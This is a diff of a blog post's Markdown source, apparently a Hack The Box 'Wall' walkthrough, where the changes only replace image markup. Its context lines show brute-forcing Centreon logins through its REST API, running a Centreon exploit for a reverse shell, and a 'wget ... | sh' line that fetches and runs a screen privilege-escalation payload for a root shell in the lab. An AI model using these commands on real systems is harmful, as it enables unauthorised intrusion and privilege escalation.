@@ -155,9 +155,9 @@ Requests/sec.: 1.202054
 
 Hmm. What have we here? Basic authentication bypassed with POST? This is what we get.
 
-<a class="image-popup">
-![0efb06c2.png](/assets/images/posts/wall-htb-walkthrough/0efb06c2.png)
-</a>
+
+{% include image.html image_alt="0efb06c2.png" image_src="/5273a13f-09e7-460c-86d5-dbeb7c7e49a1/0efb06c2.png" %}
+
 
 So `/centreon/` is the eventual directory.
 
@@ -167,9 +167,9 @@ Googling for "centreon 19.04 exploit" quickly lands me on EDB-ID [47069](https:/
 
 The login page has pesky CSRF token implemented. Well, fret not. Centreon offers REST API for authentication that bypasses the token altogether. Yeah!
 
-<a class="image-popup">
-![8a521451.png](/assets/images/posts/wall-htb-walkthrough/8a521451.png)
-</a>
+
+{% include image.html image_alt="8a521451.png" image_src="/5273a13f-09e7-460c-86d5-dbeb7c7e49a1/8a521451.png" %}
+
 
 With that in mind, I wrote a simple brute-forcer of sorts in `bash`, using `curl` as the main driver.
 
@@ -197,9 +197,9 @@ fi
 
 Combined with GNU Parallel, you get a multi-threaded brute-forcer! Let's give it a shot.
 
-<a class="image-popup">
-![e777d4e3.png](/assets/images/posts/wall-htb-walkthrough/e777d4e3.png)
-</a>
+
+{% include image.html image_alt="e777d4e3.png" image_src="/5273a13f-09e7-460c-86d5-dbeb7c7e49a1/e777d4e3.png" %}
+
 
 The credential is (`admin:password1`).
 
@@ -238,9 +238,9 @@ Let's give it a shot!
 # python exploit.py http://10.10.10.157/centreon admin password1 10.10.12.100 1234
 ```
 
-<a class="image-popup">
-![bc006b6d.png](/assets/images/posts/wall-htb-walkthrough/bc006b6d.png)
-</a>
+
+{% include image.html image_alt="bc006b6d.png" image_src="/5273a13f-09e7-460c-86d5-dbeb7c7e49a1/bc006b6d.png" %}
+
 
 Sweet.
 
@@ -248,9 +248,9 @@ Sweet.
 
 During enumeration of `www-data`'s account, I noticed a vulnerable version of `screen` was installed.
 
-<a class="image-popup">
-![0c657cee.png](/assets/images/posts/wall-htb-walkthrough/0c657cee.png)
-</a>
+
+{% include image.html image_alt="0c657cee.png" image_src="/5273a13f-09e7-460c-86d5-dbeb7c7e49a1/0c657cee.png" %}
+
 
 The exploit at EDB-ID [41154](https://www.exploit-db.com/exploits/41154) serves our need but to play it safe, I'm compiling the evil library (lines 11-20) and executable (lines 25-32) on my own machine. And since, my SimpleHTTPServer is still running, I can pull these files into the machine with `wget`.
 
@@ -276,19 +276,19 @@ Exploit it on the the machine like so.
 $ wget -O- http://10.10.12.100/rootme.sh | sh && ./rootshell
 ```
 
-<a class="image-popup">
-![07b2826a.png](/assets/images/posts/wall-htb-walkthrough/07b2826a.png)
-</a>
+
+{% include image.html image_alt="07b2826a.png" image_src="/5273a13f-09e7-460c-86d5-dbeb7c7e49a1/07b2826a.png" %}
+
 
 Bam! Getting `user.txt` and `root.txt` is trivial with a `root` shell.
 
-<a class="image-popup">
-![7e86b291.png](/assets/images/posts/wall-htb-walkthrough/7e86b291.png)
-</a>
 
-<a class="image-popup">
-![eb342004.png](/assets/images/posts/wall-htb-walkthrough/eb342004.png)
-</a>
+{% include image.html image_alt="7e86b291.png" image_src="/5273a13f-09e7-460c-86d5-dbeb7c7e49a1/7e86b291.png" %}
+
+
+
+{% include image.html image_alt="eb342004.png" image_src="/5273a13f-09e7-460c-86d5-dbeb7c7e49a1/eb342004.png" %}
+
 
 :dancer:
 
